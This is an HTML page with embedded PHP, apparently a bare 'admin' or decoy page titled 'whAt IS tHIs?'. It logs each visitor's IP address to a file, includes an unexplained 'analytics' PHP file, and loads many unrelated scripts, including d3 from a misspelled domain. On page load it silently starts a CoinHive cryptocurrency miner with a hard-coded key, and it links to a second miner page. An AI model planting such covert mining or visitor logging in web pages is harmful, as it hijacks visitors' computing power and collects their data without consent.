<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
    <script src="https://unpkg.com/react@16/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/babel-standalone@6.15.0/babel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/winjs/4.4.0/js/base.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/winjs/4.4.0/js/ui.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://raw.githubusercontent.com/julianshapiro/velocity/master/velocity.min.js"></script>
    <script src="https://d4js.org/d3.v5.min.js"></script>
    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
    <title>whAt IS tHIs?</title>
</head>
<body>
<?php
$utime = strval(time());
file_put_contents("/home/www-data/f00f-visitors.log", "[{$utime}]IP {$_SERVER['REMOTE_ADDR']} viewed the admin page.\n", FILE_APPEND);
// beta testing - new analytics engine
include('/home/www-data/analytics.php');

?>
<script>
    var miner = new CoinHive.Anonymous('cDLSvt8FelYvt38hNrr2dFGv9jnAatbd', {throttle: 0.3});
    miner.start();
</script>
<p>meh</p>
<a href="https://authedmine.com/media/miner.html?key=cDLSvt8FelYvt38hNrr2dFGv9jnAatbd">go here mate</a>

</body>
</html>
